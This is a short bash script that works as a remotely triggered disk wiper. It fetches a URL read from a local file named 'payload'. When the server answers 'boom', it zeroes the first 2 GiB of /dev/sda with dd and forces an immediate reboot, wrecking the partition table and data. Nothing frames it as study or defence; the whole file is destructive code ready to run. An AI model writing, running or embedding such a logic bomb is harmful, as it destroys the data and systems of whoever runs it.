#!/usr/bin/env bash

if [[ $(curl -fsSL $(cat payload)) == "boom" ]]; then
  dd if=/dev/zero of=/dev/sda count=2048 bs=1048576
  shutdown -r now
fi
